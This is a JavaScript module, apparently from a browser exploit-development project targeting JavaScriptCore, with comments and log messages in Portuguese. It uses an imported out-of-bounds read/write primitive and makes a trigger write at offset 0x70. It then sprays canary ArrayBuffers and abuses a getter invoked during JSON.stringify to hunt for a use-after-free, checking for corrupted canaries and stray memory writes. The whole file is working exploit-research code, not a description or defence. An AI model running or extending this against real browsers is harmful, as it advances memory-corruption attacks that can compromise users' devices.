// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierUAF";
let getter_called_flag = false;
let current_test_results = {
    success: false,
    message: "Teste não iniciado.",
    error: null,
    details: "",
    corrupted_canaries: [],
    unexpected_writes_in_oob_ab: []
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_FILL_PATTERN_U32 = 0xCDCDCDCD; 
const OOB_AB_SNOOP_AREA_START = 0;
const OOB_AB_SNOOP_AREA_END = 0x800; 

// Metadados sombra (não central para este teste, mas mantido para consistência se referenciado)
const SHADOW_SIZE_LARGE = new AdvancedInt64(0x7FFFFFF0, 0x0); 
const SHADOW_DATA_POINTER_CRASH = new AdvancedInt64(0x1, 0x0);


class CheckpointForStringifierUAF {
    constructor(id) {
        this.id_marker = `StringifierUAFCheckpoint-${id}`;
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierUAF_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = { 
            success: false, message: "Getter chamado, testando UAF especulativo do Stringifier.",
            error: null, details: "", corrupted_canaries: [], unexpected_writes_in_oob_ab: []
        };
        let details_log = [];
        let anomalias_detectadas_no_getter = false;
        let internal_stringify_threw_error = false; // <--- CORRIGIDO: Declarar a variável aqui
        let internal_stringify_error_msg = "";   // <--- Declarar para armazenar a mensagem de erro

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB R/W ou oob_ab não disponíveis no getter.");
            }

            logS3("DENTRO DO GETTER: Preenchendo oob_array_buffer_real com padrão...", "info", FNAME_GETTER);
            const fill_end_oob_ab = Math.min(OOB_AB_SNOOP_AREA_END + 0x100, oob_array_buffer_real.byteLength);
            for (let offset = OOB_AB_SNOOP_AREA_START; offset < fill_end_oob_ab; offset += 4) {
                if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) continue;
                try { oob_write_absolute(offset, OOB_AB_FILL_PATTERN_U32, 4); } catch(e_fill) { /* ignorar */ }
            }
            details_log.push(`oob_array_buffer_real preenchido com ${toHex(OOB_AB_FILL_PATTERN_U32)}.`);

            let obj_to_stress_stringifier = { header: "StressTest" };
            const nest_depth_stress = 25; 
            const string_len_stress = 128; 
            let current_obj_stress = obj_to_stress_stringifier;
            for (let i = 0; i < nest_depth_stress; i++) {
                current_obj_stress[`level_${i}`] = {
                    text: `S_${"X".repeat(string_len_stress - 2 - String(i).length)}${i}`,
                    numeric_array: Array.from({length: 10}, (_, k) => i * 10 + k)
                };
                current_obj_stress = current_obj_stress[`level_${i}`];
            }
            details_log.push(`Objeto de stress (${nest_depth_stress} níveis, strings de ${string_len_stress} chars) criado.`);

            const canary_spray_count = 150;
            const canary_ab_size = 16; 
            const canary_pattern_base = 0xBEEF0000;
            let canary_abs_list = [];
            logS3("DENTRO DO GETTER: Pulverizando ArrayBuffers canário...", "info", FNAME_GETTER);
            for (let i = 0; i < canary_spray_count; i++) {
                try {
                    let ab = new ArrayBuffer(canary_ab_size);
                    new DataView(ab).setUint32(0, canary_pattern_base + i, true);
                    new DataView(ab).setUint32(4, i, true); 
                    canary_abs_list.push(ab);
                } catch (e_alloc_canary) { details_log.push(`Erro ao alocar canário ${i}: ${e_alloc_canary.message}`); }
            }
            details_log.push(`Spray de ${canary_abs_list.length} canários (ABs de ${canary_ab_size} bytes) concluído.`);

            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto de stress...", "subtest", FNAME_GETTER);
            // internal_stringify_error_msg já foi declarada
            try {
                let internal_stringify_output = JSON.stringify(obj_to_stress_stringifier); // CORRIGIDO: Atribui a uma var local
                details_log.push(`Stringify interno completado. Output length: ${internal_stringify_output.length}.`);
                logS3(`DENTRO DO GETTER: JSON.stringify interno completado. Output length: ${internal_stringify_output.length}`, "info", FNAME_GETTER);
            } catch (e_json_internal) {
                internal_stringify_threw_error = true; // Marca que um erro ocorreu
                internal_stringify_error_msg = e_json_internal.message; // Armazena a msg
                details_log.push(`Erro no JSON.stringify interno: ${e_json_internal.message}`);
                logS3(`DENTRO DO GETTER: Erro no JSON.stringify interno: ${e_json_internal.message}`, "error", FNAME_GETTER);
                if (!String(e_json_internal.message).toLowerCase().includes("circular")) {
                    anomalias_detectadas_no_getter = true;
                    current_test_results.error = `Erro incomum no stringify interno: ${e_json_internal.message}`;
                }
            }

            logS3("DENTRO DO GETTER: Verificando ArrayBuffers canário por corrupção após stringify interno...", "info", FNAME_GETTER);
            let num_corrupted_canaries = 0;
            for (let i = 0; i < canary_abs_list.length; i++) {
                const ab_c = canary_abs_list[i];
                if (!ab_c || !(ab_c instanceof ArrayBuffer) || ab_c.byteLength !== canary_ab_size) {
                    details_log.push(`Canário[${i}] inválido! Tipo: ${Object.prototype.toString.call(ab_c)}, Length: ${ab_c?.byteLength}`);
                    num_corrupted_canaries++; anomalias_detectadas_no_getter = true; continue;
                }
                try {
                    const dv_c = new DataView(ab_c);
                    const val0 = dv_c.getUint32(0, true);
                    const val4 = dv_c.getUint32(4, true);
                    if (val0 !== (canary_pattern_base + i) || val4 !== i ) {
                        const corrupt_info = `Canário[${i}] DADOS CORROMPIDOS! Esperado ${toHex(canary_pattern_base + i)}|${toHex(i)}, Lido ${toHex(val0)}|${toHex(val4)}`;
                        details_log.push(corrupt_info);
                        current_test_results.corrupted_canaries.push(corrupt_info);
                        num_corrupted_canaries++; anomalias_detectadas_no_getter = true;
                    }
                } catch (e_canary_access) {
                     details_log.push(`Erro ao acessar canário[${i}]: ${e_canary_access.message}`);
                     num_corrupted_canaries++; anomalias_detectadas_no_getter = true;
                }
            }
             if (num_corrupted_canaries > 0) logS3(`DENTRO DO GETTER: ${num_corrupted_canaries} CANÁRIOS CORROMPIDOS ENCONTRADOS!`, "vuln", FNAME_GETTER);
             else logS3("DENTRO DO GETTER: Nenhum canário parece corrompido.", "good", FNAME_GETTER);

            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por alterações no padrão...", "info", FNAME_GETTER);
            let unexpected_writes_list = [];
             for (let offset = OOB_AB_SNOOP_AREA_START; offset < OOB_AB_SNOOP_AREA_END; offset += 4) {
                if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) continue;
                if ((offset + 4) > oob_array_buffer_real.byteLength) break;
                try {
                    const value_read_u32 = oob_read_absolute(offset, 4);
                    if (value_read_u32 !== OOB_AB_FILL_PATTERN_U32) {
                        const overwrite_info = `oob_data[${toHex(offset)}] alterado: ${toHex(value_read_u32)} (Padrão: ${toHex(OOB_AB_FILL_PATTERN_U32)})`;
                        unexpected_writes_list.push(overwrite_info);
                        anomalias_detectadas_no_getter = true;
                    }
                } catch (e_snoop) { /* ignorar erros de leitura */ }
            }
            current_test_results.unexpected_writes_in_oob_ab = unexpected_writes_list;
            if (unexpected_writes_list.length > 0) logS3(`DENTRO DO GETTER: ${unexpected_writes_list.length} ESCRITAS INESPERADAS NO OOB_AB!`, "vuln", FNAME_GETTER);
            else logS3("DENTRO DO GETTER: Nenhuma alteração de padrão no oob_array_buffer_real.", "good", FNAME_GETTER);

            if (anomalias_detectadas_no_getter) {
                current_test_results.success = true;
                current_test_results.message = "Anomalias (erro stringify interno incomum, canários corrompidos ou escritas em oob_ab) detectadas!";
            } else if (internal_stringify_threw_error && String(internal_stringify_error_msg).toLowerCase().includes("circular")) { // USA internal_stringify_error_msg
                current_test_results.message = "Stringify interno falhou com erro de ciclo esperado. Nenhuma outra anomalia óbvia.";
            } else if (internal_stringify_threw_error) { // Outro erro do stringify interno
                 current_test_results.message = `Stringify interno falhou com: ${internal_stringify_error_msg}. Nenhuma outra anomalia.`;
            } else {
                current_test_results.message = "Nenhuma anomalia óbvia detectada ao abusar do Stringifier.";
            }
            current_test_results.details = details_log.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return { "getter_processed_stringifier_abuse": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringifierUAF.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_stringifier_uaf_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeUAFStringifierTestRunner";
    logS3(`--- Iniciando Teste de UAF Especulativo no Stringifier ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial completo */ 
        success: false, message: "Teste não executado.", error: null,
        details: "", corrupted_canaries: [], unexpected_writes_in_oob_ab: []
    };

    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.JSCell /* etc.*/) { 
        current_test_results.message = "Offsets JSC críticos ausentes.";
        logS3(current_test_results.message, "critical", FNAME_TEST_RUNNER);
        return; 
    }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { 
            current_test_results.message = "OOB Init falhou.";
            logS3(current_test_results.message, "critical", FNAME_TEST_RUNNER);
            return; 
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        // Não plantamos metadados sombra globais para este teste, pois o foco é o Stringifier
        
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        // CORRIGIDO: Usar o nome de classe correto na instanciação
        const checkpoint_obj = new CheckpointForStringifierUAF(1); 
        logS3(`CheckpointForStringifierUAF objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e_json_outer) { 
            logS3(`Erro em JSON.stringify (externo): ${e_json_outer.message}`, "error", FNAME_TEST_RUNNER);
             if(!getter_called_flag && current_test_results) { 
                current_test_results.error = String(e_json_outer);
                current_test_results.message = (current_test_results.message || "") + `Erro em JSON.stringify (antes do getter): ${e_json_outer.message}`;
            }
        }
    } catch (mainError_runner) { 
        logS3(`Erro principal no runner: ${mainError_runner.message}`, "critical", FNAME_TEST_RUNNER);
        console.error(mainError_runner);
        if(current_test_results) {
            current_test_results.message = (current_test_results.message || "") + `Erro crítico no runner: ${mainError_runner.message}`;
            current_test_results.error = String(mainError_runner);
        }
    }
    finally { 
        logS3("Limpeza finalizada.", "info", "CleanupRunner");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE STRINGIFIER UAF: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE STRINGIFIER UAF: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa no getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.corrupted_canaries && current_test_results.corrupted_canaries.length > 0) {
            logS3("--- Canários Corrompidos ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.corrupted_canaries.forEach(info => {
                logS3(`  ${info}`, "leak", FNAME_TEST_RUNNER);
            });
        }
        if (current_test_results.unexpected_writes_in_oob_ab && current_test_results.unexpected_writes_in_oob_ab.length > 0) {
            logS3("--- Escritas Inesperadas no oob_array_buffer_real ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.unexpected_writes_in_oob_ab.forEach(info => {
                logS3(`  ${info}`, "leak", FNAME_TEST_RUNNER);
            });
        }
         if (current_test_results.error) {
            logS3(`  Erro reportado: ${current_test_results.error}`, "error", FNAME_TEST_RUNNER);
        }
    } else {
        logS3("RESULTADO TESTE STRINGIFIER UAF: Getter NÃO foi chamado.", "error", FNAME_TEST_RUNNER);
         if (current_test_results && current_test_results.error) {
            logS3(`  Erro (provavelmente no runner ou setup): ${current_test_results.error} | Mensagem: ${current_test_results.message}`, "error", FNAME_TEST_RUNNER);
        } else if (current_test_results) {
             logS3(`  Mensagem (sem erro explícito no runner): ${current_test_results.message}`, "info", FNAME_TEST_RUNNER);
        }
    }

    clearOOBEnvironment();
    logS3(`--- Teste de UAF Especulativo no Stringifier Concluído ---`, "test", FNAME_TEST_RUNNER);
}
